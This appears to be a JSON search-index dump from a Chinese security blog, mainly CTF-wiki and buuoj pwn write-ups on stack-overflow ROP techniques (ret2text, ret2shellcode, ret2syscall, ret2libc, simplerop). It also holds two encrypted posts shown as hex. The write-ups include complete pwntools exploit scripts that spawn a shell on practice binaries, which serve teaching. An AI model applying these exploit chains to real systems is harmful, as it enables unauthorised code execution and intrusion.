qemu/util/memfd.c 中报错部分的 static 函数以及引用头文件重新编译即可 # 参考文章 http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/ https://icyshuai.blog.csdn.net/article/details/71499619","link":"/2022/04/10/OPTEE_ATF/"},{"title":"To kk","text":"a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53703ba34bffad512cca69fdafbe61f6ae9db60bb0d77fe918acfc319a96214a6c221fa88c0012d7a9f8b6296dbce5c377d800c4c6d93e51fa2e15e8b28d45c26481b410a350aab4b45324f655bf0b638e15095bcbd036fb30406c7bb75c32da536a19cb5150d848fac97f4e24ab1bd165a207553b4f8983eda5e5e25ff6ef22e603b0f602fec1b54e9411d91a299b03eca1d90fe8fff28985965c90b34582265955e2ed38d2cb88f362e9b69ff2734f59ec530b56556232f4b7a26fe4b335d5096d654f8700dc273a74a0124a9eeb6bbfbf20774776ab88f3cdc03aeed95d4a3ede5e343b7aa206c3f08924191a6955f65ef3f7ac9ad32a038870855ca3c7acfa717698093fa35eb0a93a88dc795447ef7282b7560dec5419127d3e1f2230de8805c2b9b5847f6e2712ab1f4e303b5c754a284c972c9c6aad70015f05005cb157c773e8a25eb5877a630facd3857fb00400794702a6feae82fd2499981faf2e0b73d2a3c72989d93f03ddd0a1b85c3a02edb8d2595af4c2c55da9390784bb142ba341ff3fe4ff7041879a50324ce55098ce9be4590eb54348371ce0d216e6c360dcfe0915d03b7c30b96d2a220cad4e03e5d87e657d88111dbfd8c7431be8d704b05db3f97555afe5c34d8fd5cc31c3e171b74a9367ecf20f9653435d1e6d69389db1eae1b5d847d15f3cbb34df3b3ea893e1d8c03cc374ebbb90b2ff30dae7a08255785533da4cf8aa90a70ee4e22017919de0e7ea05e25b7e8e30aa33a72b4d42fa3121b4dd7a79e241e42c8aeac1cd098a75a75b0cbca649d39d03a38d4b67b5bbe9b993cb540f3bf5f4772b69c04a2792fff2f415aceb6bf269d5fabd6814d77894dd70eb8f8bd04e3098214d503ad9c75f54ab1458dde8c1b0e6aba744802b7d9d7ab9e86da0408dc0231f00b744e7c162e139bbca0d12ab6d3cec4cbe97e886477dfd5d9b1846bf8ff7795c30d6ea46d41a68eb05cf8e65feabb9e177becd2b81fade2e26eb88d9338228f76f7e45e8355e9e1bfd6929c4d66594681b0aae60f5a82527043dc5b8a6ecf2975c60528ea683ab8481a720f5d5ac5414cebd97d6d31177f398c4db556e045ffd961d9f6d31db8a71cc0c0fa31ec1f0b7ea5dc4bd7038c55e4287ab6655760e6b2200c6c73c4fe9508555e6b763479b7bcfb0386bdaf8ba20a347d90e1095aa443d20c12a68867eca1d94ca5a5422b317cfab797432fe3186ee76ecf953c638801585f3ae222da1f0232ab4171c8566695d74a4dcc575dfc96769ef870eea1b310844e7b80a626985b7cf503076bbf1eabf8807ed94163702f0327b5e232d4ab96c6d0664738e0b1e9c0a796d4e16c3a29ab3e2c322c10ba4f100fca47eea33e77dae5604ffbcb82c43737ca88a4f574ea9f0709d6d58d1be722243540f50219b7d9db9c38656a69a87a90ef1f68bc545a7f7f8ba7bbb265bb2daf77b65e53d7d9b9e90a273beecddbe2f2776d14871cd2adb8e0c8ee94d6694d29b60a7e529d9a0b2b26d597a42c965910ff06b620cea879251447d78314829c908bb75645f26e4b8a460f291afba15a4b9d6b6771d69c6d9180054844aaf077824e408b19cc66b8c0eaa55077da66d2ee7f5982ce88bfed0e677e20d3799973c7f9dea793f43bdce40bdb8ba96415c2fbf0c324185de0723dd14239b5636464ed93d4374d3840c2c67e1697495c0fff1cbacd5c8de085b08e8e9cc0f925f32b8d6242ae076aa602135e1a1798d7a6fd396b844f4b82b275c6ec9a23791db9e2acca00dce7e80105255b0a337c4ab25b50b101b2761a27cd15a40ad547730bfd23cdb526095c76e0d87a103b8d5256a0038cf48aa6b12b4a0c2afeb8fff007532511d7bb04e8ab721d45ff7e3deab6b4ec1990162d35babfd605b17a4b90f4f413e68bd0e72a184c36147bbb127c1a2932664a5a09cad7cbeee6d7d181813702b1665daa9de7662ad9a504a7ecea6333a53d152f18b8ededb4e6bfa8914d2c58cd69dad17bf3e88182c3cc9785ae706e68f2775e3b0f95bf4a56a1bd7ea02e06c2b22072faf82bd34ab0f08470737d7a5adbc6e5360799e165e378c0ff8921761e1e0101b88aa9ff2af0b623b465ea082ad9dcd134737005fceb63d352927d7b6f4f253b9ac3b41e82842464f4bda5751ac90494b2decd2f97c7df2c1e29b1f5d8668913a3d1b9b8775a04d5d3a81a2bf9b9ee5a758f06196759b1385d03831df3cc834d25001fc66f9a36cd9c89bbe4dd2954c42a69281182f71d574f3f29ba9b68f6905b63a0a1505315528582738b20c4627c056a59a4f74d8bb15785abbab589d9da4305d103f5dbb45cc7ece3f043b872490f9e0130a01d5015c090dd72c96971b422c4ba85443bd28449b8d5f3f526a2cb40b83d86f905296327b387e89635d7e1fd9ac75914520965d1d3f26b99d47a5913c054391a9652bb3d27db0666ec2ddd1be66e5274ae05ea37b315080ce921cf962b9d8419bde60dcabcf84608ff14db390a383ec8364dfcbff6b7da98797805f8540f4935d3e1d7e149cf3fc46f6b0d4f7ef7529570394343d527ae1591af2b704cf8d4368af95249f7c453df1e7a7a8aa1857a1aff0565870c3f74eed05026a9cd6d4e567ab0f547e23cb2fee7dcb3da11507f978 Pease input your password","link":"/2022/01/02/To%20kk/"},{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"# 基本 ROP # ret2text 首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了 NX 保护，即不可在栈上执行代码。 使用 IDA 查看源码，可以看到这里有一个危险的 gets 函数 以及这里有一个 system 函数 所以如果能直接返回到 0x804863A，即可执行该函数。 在 GDB 中对 main 函数里的 gets 函数下断点。 可以看到，存储局部变量 s (eax) 位于 esp 中存储 查看 esp 和 ebp 得知 s 的地址为 0xffffcecc ebp 地址为 0xffffcf38 两者距离 108 个字节 所以 108+4=112 即为返回地址的地址。(因为没有开启 canary，ebp 上就是返回地址的值了。) python 脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 # ret2shellcode 先检查程序的保护机制 全部关闭，并且通过 RELRO 为 Partial 部分模式，得知程序存在存在可读可写可执行段。 通过 IDA 观察得知，这次同样使用不安全的 gets 输入，并且将输入完的值拷贝至 buf2，观察 buf2 是什么样的一块内存。 buf 是一块位于 bss 段的可读可写可执行段。所以泄露思路为: 将 shellcode 拷贝至 buf2 里，然后通过堆栈溢出将函数返回到执行 buf2 即可。 在 gets 函数处下断点 得知 s 地址为 0xffffcecc，ebp 地址为 0xffffcf38 ebp+4 即为函数返回地址。 所以 0xcf38-0xcecc+4 即为 s 与返回地址之间的字节距离。 写 python 脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() # ret2syscall 先检查开启了哪些防护措施 开启了 NX 保护，所以无法在栈上直接执行代码。 使用 IDA 查看，仍然是 gets 函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到 pop eax,ret，以同样的方法找到 ebx.ecx.edx 以及 int 80h 系统调用和 bin/sh 接下来要了解 payload 这样构成的原因，需要知道这三个指令 在堆栈里，我们知道 ebp+4 的地方为返回地址。这是因为 leave 时 esp=ebp+4,ret 将当前 esp 指向的值作为返回地址跳转并且 ESP+4。 所以构造 payload 为 payload = flat ([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用 112 个 A 填充，pop_eax_ret 为第一个返回地址，然后 ESP 指向 0xb, 以此类推。 写出 python 脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() # ret2libc1 给出 got 表 PLT 表 以及 libc 的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了 NX 检查是否存在 /bin/sh 在 IDA 中查找 system 函数 查看到 ptl 处的 system 函数 写 Python 脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() # ret2libc2 这里仍然用相同的流程，唯一不同的是没有直接给出 /bin/sh, 需要先调用 gets 函数再利用 pop ret 调用 system 函数 直接给出 python 的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的 ESP 指向流程图，顺着思考容易看懂 payload # ret2libc3 检查安全保护，只开启了 NX IDA 里查看，仍然是 gets 函数的堆栈溢出。 但是这里没有给 system 函数 也没有给定的 /bin/sh 所以需要我们从 libc 中调用 system 函数 根据这个知识点 写 exp, 涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"cmcc_simplerop","text":"系统调用 + rop # cmcc_simplerop # 程序分析 32 位程序，开了 NX，部分 RELRO 保护 主函数存在栈溢出 该题 没有 system 函数和’/bin/sh’，考虑使用 int 80 系统调用，地址为 0x080493e1 设置系统调用 int80 (11,&quot;/bin/sh&quot;,null,null&quot;) 的参数 eax,ebx,ecx,edx 找到 eax，进行赋值，地址为 0x080bae06 找到 pop edx;pop,ecx;ret，地址为 0x0806e850 接下来调用 read 函数，将 /bin/sh 写入 bss 段，没有开 PIE，bss 地址为绝对地址。 # EXP 12345678910111213141516171819202122232425#coding=utf-8from pwn import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)# p = remote(&quot;node4.buuoj.cn&quot;, 29088)p = process('./simplerop')read_addr = 0x0806cd50int_80 = 0x080493e1pop_eax_ret = 0x080bae06pop_edx_ecx_eax_ret = 0x0806e850bss_addr = 0x080eb584payload = &quot;a&quot; * 0x20 + p32(read_addr) # 返回到read函数payload += p32(pop_edx_ecx_eax_ret) # 平衡栈空间payload += p32(0) + p32(bss_addr) + p32(8) # read函数的三个参数 payload += p32(pop_eax_ret) + p32(0xb) # 对eax进行赋值为11# 对edx、ecx、ebx进行赋值payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr)payload += p32(int_80)p.sendlineafter(&quot;:&quot;, payload)p.sendline(&quot;/bin/sh\\x00&quot;)p.interactive()","link":"/2022/01/24/cmcc_simplerop/"},{"title":"Diaries","text":"b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02bc4de03a4c0bde1397987ad05a5904d00274cb29ed724545b94f9d252ea8414ebd4c44790d5faa95bda27c4ac90b3dbe7fbb3dc3e9882a5f3788bd09af293d89ce166e6838a4b09bdfd97f5b6e0c4002f908093c097f3d51787bdbcbb938f3be4e771d94ae9a8fec6a51592e1f71b753d4337ea00ae8cf9f9a437538cedccc4b90523d5c600e5f8e85d09826563eacea409070077698a537f91cf5e25c803f8d304b554b985ec3a8eb9cab7a78fc569af2427a5599a212432783d590ddad71c3f7cebb4b7a4c60ba19d947fcc75e7634e5506f9c2f27afaab094be16c44561eb4c3a8ab7ecebee25aa05ba16860089245095a5695821bfb6f0fe5e4ae38a9830115a6e7bc8750f4825607a40402666b8bf21f4f9b29818783f05a5cd6a594d4ce0f13a29380d14159b338b22603ee52b7f001ef02290c84de26412cb86d3630385523881be8bc75d8232079724d144186b3659b760055e3fa0d6de41fc1ce75610e204440f7de2cbdc6483ad80cbc5dfdfd2b1592d9f274d17922198d7a23cce2f515265f694f189808f55992542c25946fc8218411bb70be40036c8a817578ab4f80bd5f21b9a94820b7e1773dce4b325f9e077e96464d97ab9bb62ebc4fded6281cd7fc5feb0cfe0782b71b393c6888d253f8cf7a00617e523f7928f6c5a79718bc056c26f919546ac7a5c06a0734127a2e713eaa105fb636739670fd02947c98ad78302f48609611e08e0aa166d6c3e3454363107812b06c09af3819ed1689b2f33812fbefa318dcd88d0c88832e2b60452d633dda37662e2cca1d2d4279dcb7aea4153a2470981d2a20fb959bd36e21a138b88a83e95f1f39919fe5b021da3a5b5b063a2afd24d1dee68bd965ed808c68bc93f6b5ee38df7471321d9ba698e1708eb7bba78a4e05e32ab8c4e0946c226dfda777d0ad5181c4da3da208b5b9aa06f8ee9ca6218340d7894804ba03a7cc4499f749335a8098cb402b5dee833e85ff14f0d7448cce7563f570c7ccf7a415573575d36bc64b5156e97b4682019f1b3b58d9cc0b9505bc77722f22c6632111d0a215c4ed593de3766b36d08fe3c255c52cdb9f6447a0e8cf819c4f15ac2885547eee05ad29506717bb75c39ed1a4a45cb1ac62eb14a37690e07fc092313f4f68cb44172d9f4cd6ef09173ff12e51fece93b7befa8a0d8b17a6409af12701de2642f366c007c7984bca9951527243716530c5470fc5dde6c2c45621c1f585b718496a1b458668d57d3d960473acf363b96e2a4e0e37a78974b55f3b4fd7dc62857e0e304d1b4d40a4fe587022972cff7ab1ed797d2d5f2c70406aa09ea8b8d4fa5f5f4ccc2d1174ac0f08a9468d26fd476cab0c5c2b88879ad9057bae9e00d274898d59639242a113108a779355d9a7b19757927f25e042ad98b942023e300116d2728250a2dfd0c170075e1ae019ea2f7460fed77bf6d3f24c81a60269151ccfe598f53d2e782e6c03c34cf4bebab578780a7d5dd19345f0623449743683174fd83678e7fe68105c150365ffb9b7ed800cadc25b1913a637f324ac9eb44c45b5c63189d2bab7f04dc1d62cc82cfa309ea0c52121fc8d2eb1df229c45ae164d68cf4a31f8d75deb59bc1c8275bd286bc04c5204f2725b6a33ae24bad7e0eedd5888047c5ea13064c90bd8f034421825fce9a28d07af37af6e59409c6ba833a2598f9804d3a0de1ed7d5c40ad40600e7ccced00215280592ce5b9ee50eef04dac198c1c8c6db37e094edecf0175a28b461de4c7a748e8185408dfa238e02930faf9e213ccc59a3d4f9d6c0c3e90ff887c8cfa117394ccfedd272233e491d9d2c1183c82a65ae923c2acb42af36920e51395bd557972865d575136849d08660f59c10166910a2bffc63fe2497c013aa873aa2bd5dcdadd45f8fcb95cd233d34f4d85d61fd50e142a9aa076298ab37be471de9786cb089ac53f825843fecf95640c3cbd189cbddf2089ec3909cca18bd65ea7a9c1cfe926a9dbb03dd530eb8f602ccc7f3dfd49cceb743c4b692bb0a157ecc67920d60f17913c1395a8935ad6ea3237170d4fb1689126376a85bbc2681d99916a59a15e8c52dca5eb579cb5cb8da4581a3319d463c6cdbeeba92390a7e99634e84d7d54298683941c97c2559bf77055fed6ab67c61b6b9dc44eee905a4c577fcd4d2aae087dec024441ec0ed8dc89bedbb88d5c1bdafbf07e281c1f1ccfc60e884773c7e8b82d214b445bf0e01daa29112ec2af26833bad24ff94e796a00d9b218173bafe845198d02355cf0c9fbba1bff0dffd19abc6e214fb4d89e9fcdd7e72d1900a2fb8277ca3134577522385e199f8a08fe3c42525225a62ef8159fe5a5a3bc763d4a7eb347d1959988d21be181f1c9a722df439618288e36bfab320b1598c0c41d796e51faabd2cbf0f355c3ade511cd0c92f8bb4e81aa6d6e5ff11cbeb8461f4c044b06d259df94433052f4a2e1ca4a2b1d522985cf9c0a8abbd2ada2317ae976357661ae06c692cebf4305326be49dc3e81718e1ddc487a7c74420b8e0c77c92027e48bd7fc2aa94980733109029ffab6f8cd52d5eb037bba7fd172567701609ea176bf76eee46973c2d27835c5a93e9421bd21b5da7d566b70bef0fdb394b9f765e265727ea8fdf093a90f4eb66bc5f11e38b979424e85af1140b76178a0a91191dd74f5a79da9b45db67c0d7172b0a2bdc4729eba387e7fe03392623c91ce0c7731fabf79ec43795ca48683fe2200d74e1a694fc1a24f546d161641ff5188d54d96599c9e0597f54c5665d7f1ae203d5bf00e6ed6f63f7e288c831cf8639e7ff240ced5a94a7a57603706eac65b1cb00336ab34ff3e34260da25dee3359a90efa9fe158b0cd2e1aa9bafb7077e78293ec81b2bda620c95ba7897b4775e438f19648be41f446880b3d686d48d59734e534622c896554a3dbf0f9cf062f5c24d3556a91cce20fdd593af182e95b64ea2e11ea481f87364ff8597f355c84234507bb414493fd54b9d502ea2689258787ef0b04f15200ff0342fd9cf1805700e544d3fb3dd254416ccc8994ae177c16205e9e25b0d9d945558ba54906b415c291c2a50a245716d6a17a90123de110eae595c274f730a320fc026d6112337fd0bf460d6f9840333734bf6e7d319210f8d76a517f656e1cd28ba0d8bff011ed4dcf8301bc8ddf7d14d89edd74d064dd1a5feaed9244fbfe036808370698cce6f935093e3ccabb67f2238d30a6506321d6c00b77a31f64e9f702f06304aecbf0d02afeff20c2c427c3c62fb83f511f0a5e662639562ef90d7755fda30f49fe31c51e0ef29b4f5ca31329823037ec5c27a7e587cf594f97c370c8fc2f085315662e2befd48e8d259177d9877c11f8c5d7a2e653ab32199b00aa144c8574316bc0f496c7680f45d1e07c0bd2a6ced1ac03d3e8cb875491af60acf2d8087159990b6d034c4de846f7ed366a930fc0379ed84fd5621c6b648330c0c5c1ba9e1d8c922a2e8d95d987faf92bb53e0e0859740fea25c7c8aef6236978f442d14d16f118966ee4d3028272a4ece72747b7ad250f527a9078a2e282e2661471d2ed8dcdd0f3c8adf5bf09bbd371399b846cfb42017f1d87e87f25035d0970bc80451ead46111dfa89ca3930dcb998653dcec823ad80d7983b46f53a1a64be3c5a0e49ab1fe564b1937170890c54128bfe5c3dc98b22a7307c6d8ced9551b9aa4b867d658ed9f293e4f747287c28dd28adf53b6095c3b9b725660eca83a06bd17e2f1083bccf68c98d62a6e96a3b9008d6d1e7f2aeeb990f55700bb4e665e81c3018177ed2b3b206054ab5ee7097a014eea3442f99ee415ecf657b775b9cef7c928a5b5b89ad077fc452d0ec17ed90f07ced540e924f21867438a69e67b0018f317f9ca23a5b4f4359ff1a0beaf3e6865bfee9cbe74ce4cb6e82f2c868390b2a8a5c46e77a1d4ac8bff36c02ffddecb57d3538c0f01c6d5fa3d70c8fe51cd4c41642543f35e4c65cae900e89b8fa55c431e3b130f7265d25d1edace248fc87299290a69bffd56bea9d6d9d7c52a7a3aa14850d5ea6ce5e47171d9153305e6c11765cb5c4e5b92e7dae2766ae1c976f632cb5a0090f32012cd7146ed8212aeea8dd7d658b55d331d7b983cae9ce5fa5f77a226b1ad17249666da7f24cbeae7addf38ed8c488aa4d175cda5354b179c5354d96ae33fe2cde62f500302936abb458e1fceeb89c74bce9b908286bc4050ea4b20635ffdd911a2a7c1ae671cd79be65e530ebccd0f29a4c86a0aa752a0215cd159ea8aac4e52dbd428dd7b5d7f5c5dfbc2c6ce1a581647f88643365f5dad26f69fca59d3f55d0ec2e6619ff06e4a5167a9e32877b83ccd84f5e690770b684b366b13268828844d70cf490cfa4e1dd6ded66fde48cc5abb6ba57011369b55ce1c18b7e2725e9cec2fe766c569afa1d9cbc74d8d8c41863d8b63cf7410b269ac9725b23e946de3268ebc630d18f25e1dd8b3601274691c4a56a5d4c7016c7c23df5cc5ae6bc1e545b574d14b0a766cdddde6c2e8c5f3b1efc75374fd6dcd4a403074d887c9129d4a523feb742c944ad1cb5ca4f5481e409ca2a6da397503d1972858413cea084dcd29fcdbf22370e401f9e91de9ef4e2a733c1c91a2f673b04ff139e74163e717f7aad4e0e2600170900614cab5c908b35cda40eadcef4839baa9dbf61d04e37b6a0cf5367679f7dfcf9f7240bae2654a55ec608dc26f7d49fc277a2f3491b313bf4159b1b45746a91cf9f603e2208084db2da55e49aaa68c8288aa605da77d8e541f4a599f69e12a626e18fabbf18b23151a6bdb20058e8cff469df0aef372dc1192fce3d8dfa629fe69f89178511a400ba9847f242a8e9f6bfcdd5880ee1abd38be5f26d211365102afb3a5fdfc7efeea77123b4361debc38ccd7da3796f3293f7c9caca3d21a53e33ca5d85a64b159cf8d42a48e3d9845ab89b57d41c883f7d0333b15647b3429f75057a34dd9c04fd38092c028dbd028abbb31f1cf00d313bba589d37cace30277a317491b915e521a6cafb414b46f7fcf848ae2a57268f258ff7b7bbce21b60c117aa9191ab5ae0df5fc344c9e90784c0d86e75cef8fb949c9179a84b51fa6fb6fe6b7f25a0dc099dbd9ed6bc38c840f2a02ae38078a352d6965a7e1c5e6e56f864b91ae83171324280374991e1e0d0f62f632a57edd25dadb457744f02933213b2f9bd519b29523d7b32f0568c94cce3c7b13446e0053c5163634806efd316375d6e682bde4bf185ff30a1fed28dc6c172076dae1fe9a422d80a4fc46213d4cee7568898849a236e39dd32c4ae8b0b6357e5340a9ae19a4392f1a835361bf54df2d426f9397345885a3e704041fa02ed8ffca486e30150ad603e9cecebbc6d601318052eb4b750b9a0622748d327dd7414d97af1cf8f91ee960a9571fc7413062f6f063e503e0efd944b0d2f89374478dc2b8c560dab50395d4288b916bf70925d4d1e68582af81909a47e4641fd547dc185fdaa7b7d3b34067ef08df391f270cfa80e4a7285a7510929da450660aea099711bb64a883252e3905b696ece22c12987676cc8dda4bbf93b0b227955ea4c3149e83faf3d2a64133dafdc41483ffd8f6e0b4eddbd3a266e0625e844f477be7fa0aa38aa1150a58f5ef780550536338b27164cbb90a5f7b7493100e15f6d84710e6459411ed859306975174b7f73bc5ab8b74e87b3a8bf20273ffcd1127d07fd71b3e216ba062b20a000ae12fccdbe04ede2f0b45ee4a91eb3a7f403d818e1c61a2b90fd4fa295aac370ddb3c27fd0536c1418851cf549f4430793ba0a66f1f0fe6e8eaf2096c803b133fb40da9d2620782736d32e040d08bf7c8fbbb82083f8a39b74614590735dc194b79ca74e6a305b665175de8f33e6b601de96a948e6fa9c96247b9d557afd8f200e03077fcc16e14ed2bed30c13213cdf7f8c3b82aa783a9256b0a672e9755cfdd4532854d9bb7e0d83cb68693f13275f6e99ccb2fb801ae279568251e004c53c42d01ce850664dd083c60e735c5cbd904316b3c29e6872b65c5b11a3b81f399ef24d3cde3b4ca2a55a067bf162fd857e903b487673d2b02fce56b269f657bd9793dbee905ce5482c7b43775df776201e57d5f9aca2dbcf6483f79f50bade673b2be568a52e3d89c2ccfcbf91b3c9462a3fba19cf4a331a6dd7ccf68a4f1c216e724b506e910b0acf28b28beee95fb7836eeabf2daa261ee0fdcfc6158877c5b7689cbec95174c70590fc357be2abb704dcd128f80049afae70fe0770840a8d4fb6853b1fe378aae2ad01770d5b4d530c8ea97333623feceb614ee787cd11a47ab06defaada20840f615017b9d6d4ad8a8c80887ca1bf83796c29b807ccb8d4bd274196b4643be7e58ebe2150dbc6c5a861017cb6b1f93eb7e6d4e848a979636e96786a6285c7eb7d665e88615588d22a7bd6974a41e242740561747f2974b4971d8d3cf6cde97ad4eb02a0c1b7a362d637b8fdf5a6645c617f32df8d5144708beea32ae4c88a5a0384b61b613915f84cebc025e799288fa19d58ca42109e0578548a3cd97517eb3597fc80033ec483d0492e0de631a481b314050348e253c499cb1549ae94612682d3c0b091b9e980b092cc6f9b3a9e34cd9d8d17ba4ddfde86be8363cf9aeb8ee6a751981c35cd3a7c416a0ff8141d8061281ec186d99e8e6fd0cd77b4bbd2a4e923810beef301f1e0cb206a2e8399011ebc3e5563b0951ca4bed1825a333cd77e4ff4fa8e57c95bfcc836a0368cc7bfcfbd70d41a8c44487ab19d8a56c789e5d294a25ae6a606094a89faba970a80fc7b1f219c081ca85a1fa4521d3e15d0cd3c816ada5813bb4780ab0b5620026c01145b1c6f854fb68dbcfb332a2e2f6d02a7b6e8edf380863f6cba1d9aa274461bebccf41e25e0f6c6cb7de4242bd0b2473c08dffa5a9a73f42c32ded61d0048f102a12d8c5a0a87da95c4863d62d76c759316cf3bbf55306277526a9110e6b9884cdf5885c84f0461b69ba6ba7dd09a21ca7e14786785f0d4f30063f2c0d60869bf96a4c637fee3c95439ddf90794ce986068083bbbe5be9979d878f5dfb8e3a57e956b37928361dfd3eb6bfd80ace52810dc469f09eaf809030811fa267ded1758a8e1950cd2304b9dea0c0fa9d86fc9e99f50680e5663a36f8465304407dd40a2a4a0e624de65a64497d00037031a7b91827168bf1795cd0a83d8498adbda91d85086249944418df031f9547fa1cb7d49c68dee852e5b3be622a6e117791a720f12d8233cd45ace21f8874b11a24d1c39b58b4cd4c761c3e4efea7c28750dce9ef4f8f9b8b4c71d326d367f94559032d9ceb122cf49f9b4bd124ea5d7a45b51a1cea72c374b25ee861b0aa3cecd92696f648c6cf4ad786be265e99829c8f9ef7547e1f16ba654848365f326e997952a564642c39b8fba0cf8ca5b50ccd7c2ad11e3b80064c2c7d642681afb03d2f96007f8ff60a35832e184b061e36efd90079a96b0d69cbaff40ed9017ebf26c7156ad7cc01f8a459561a9efd6d012d2d399cb69a96ebc56cbe74cc5f06a74e282722b5bf0574dfac9d5f0264233d628356be2c103a89cd165ddbf47c0acf744e922f564713e3ccd450c50d235445e75e295c52c27f286a11ffdf8f39a4aab2c0d953fe57f810d25c91fa8a8af42d2453a4a48eada1cf1acf4c6844c629de04eaea119fdf978012ae453f1c26d3cd1f78ca1e674fd35898d3c529eab101cb0e196a9c86ade8b5cd0e613728fd12b5b9fd11acae9403eb41d7501de0e2589c1e7f3d2fffd59206ac4e537ceeae19ceaaf6829db4581dc0b14417579908fa2aa932217dffcbb3c77456eb3c5a37253c6297649927a87353da9221b99f7f69f2434904a4fc8bd701be1984708eec6c045cd76a6b08dc629d23469c2fbf04e99d91088fda1a6ac6b5c8f57ebd3fc13d93f74529aa438e212a4bed67cc6205e8f860e0e0375940bb05fa25b5a410f26ea56d1cc0751f2d5315b5fbaa4549084c504d1d600c4be97701fe243f222bb9ecc8a5260fdb1e09c7cbc2b70e18bcc204f43321427316fb62653743333aed955d38de6633a45aef806504bd5b503af7f07306ceec3255f7f4bf21fda2d03cfc65a0b549a3c75fb44d443df501e516d7bea6dcc8f1834408b6e22853bb8bbcf3079a12a0ba257cbf408bb8483082b4028aba57908dfd52a5b25aec8d4a96e14b73a9c4936a0603e465cf409298b147a4b67dc082bbad7f9f9b5234902ac8bb97e514d54f09c5575a32da647c2288ef998c33e408d54764e963ecc2c55d52c28e92b1f2cfdbfb0a1ba3f4efa230dcf928ad261418a80e21b0011868b1a26caedf4256ef5ac3fb091957835e5ef271d2376630b232e5e4bdc600468f55fe04a9f4d80255d752362a0b9df9c5f2efac5946964231c8bd4b1dbc921cbeacc54afe429ca549a3fef78cb2825006f089f2b45103747477fd3598b536202b06df536847cc385f3dc36f0d16ca5c32364b379a3e10c2402ce0e75d06ffcb900bd1e8673345e836aaf833e9ba649a0fc78c0a644701b4b6c849c296007e4bdaec6a3adb9f1fcbbfaa4e025e0a0a9ba0af37cf39ba397fa8cb3a4626cb62d35be0b22b25a572654d93cac8890421e07f8c6eabe4f267e56c2cbd10c8d3b14723e79d76a9038a73d4d51f81473cc1bc3c99df369b4b866b846b2b635be9452511e10cedd351279878382d9befb59cf471d5b5514bf8ed9c42bd4f7035875bcf2fe394d9d5b637a398959abc7366c40365c04a3bec4162ab8dd3beb554cd54497ed380f94a9f07b933687a3c20d4557a3b569ffebfde15265ff61c7512edf9a4ff919e1e0f260d46aef26011e144ce873ba7f0f7dda9f5a0895576a20474948b3ca31fa732b3f9279647481b0602297b813491e11d15ac0906eacd2ff339a59e3c8efacaa7df2c1a138725252010197c82b3aa205a6934755c14a625045c74d9de52072a1569d5feb808db3db481e9ea0d994ac6268abc0c6a949092584cb54c24d8ac3d0c866a6c4a571c045e06408d6fbd8f3f78ec21bcd09daff96674b81ade1a9cced0ce12025c7f63ee9d8428e25eecb3c2c1d53e37ac00